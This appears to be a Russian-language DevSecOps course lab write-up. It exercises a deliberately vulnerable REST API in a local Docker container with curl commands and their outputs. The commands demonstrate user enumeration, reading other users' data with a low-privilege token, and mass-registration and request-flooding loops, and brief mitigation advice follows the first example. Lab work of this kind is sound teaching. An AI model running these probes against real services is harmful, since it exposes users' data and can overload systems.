## Задание 2
Скачать уязвимый образ с docker.hub, выполнив команду из консоли docker pull ket9/otus-devsecops-owasp-rest
Запустить образ docker run -d -p 8080:8080 ket9/otus-devsecops-owasp-rest:latest
Зайти на http://localhost:8080/, посмотреть, какой функционал доступен в приложении.
Наполнить базу данных, перейдя по ссылке http://localhost:8080/createdb

### A01:2021 – Broken Access Control (Нарушение управления доступом)
```
curl http://localhost:8080/users/v1/register \
     -H "Content-Type: application/json" \
     -d '{"username": "testuser3", "password": "123459", "email": "testuser3@example.com"}'
{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}%

curl http://localhost:8080/users/v1
{"users":[{"email":"mail1@mail.com","username":"name1"},{"email":"mail2@mail.com","username":"name2"},{"email":"admin@mail.com","username":"admin"},{"email":"testuser@example.com","username":"testuser"},{"email":"testuser2@example.com","username":"testuser2"},{"email":"testuser3@example.com","username":"testuser3"}]}
```
Как защититься?
```
Закрыть доступ к /users/v1, требовать аутентификацию.
Фильтровать вывод (например, не показывать email).
Добавить rate limiting на регистрацию.
```
## API1:2023 Broken Object Level Authorization
```
curl -X POST http://localhost:8080/users/v1/login \
     -H "Content-Type: application/json" \
     -d '{"username": "testuser3", "password": "123459"}'
```
С полученным токеном:

curl -X GET http://localhost:8080/users/v1/admin \
     -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9eyJleHAiOjE3NDI3MzczNTgsImlhdCI6MTc0MjczNzI5OCwic3ViIjoidGVzdHVzZXIzIn0P8qJ4ymAxFhiExQHwPz0Ge202Iu0WWfhzkqam29wU2Y"
```
получил ответ:
```
{"username": "admin", "email": "admin@mail.com"}%
```


## API2:2023 Broken Authentication


```
curl -X POST http://localhost:8080/users/v1/login \
     -H "Content-Type: application/json" \     -d '{"username": "testuser3", "password": "123459"}'
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NDI3MzgzNTAsImlhdCI6MTc0MjczODI5MCwic3ViIjoidGVzdHVzZXIzIn0.RU0xmFFpjDz5TJAlYoINURvERBgyihJhjPs-8rl8tVE", "message": "Successfully logged in.", "status": "success"}

curl -X GET http://localhost:8080/users/v1/testuser2 \
     -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NDI3MzgzNTAsImlhdCI6MTc0MjczODI5MCwic3ViIjoidGVzdHVzZXIzIn0.RU0xmFFpjDz5TJAlYoINURvERBgyihJhjPs-8rl8tVE"
{"username": "testuser2", "email": "testuser2@example.com"}%
```

## API4:2023 Unrestricted Resource Consumption
```
or i in {20..30}; do
  curl -X POST http://localhost:8080/users/v1/register \
     -H "Content-Type: application/json" \
     -d "{\"username\": \"testuser$i\", \"password\": \"password123\", \"email\": \"testuser$i@example.com\"}"
done

{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}%
```

или еще один c неограниченным количеством запросов:
```
for i in {1..10000}; do
  curl http://localhost:8080/users/v1
done
```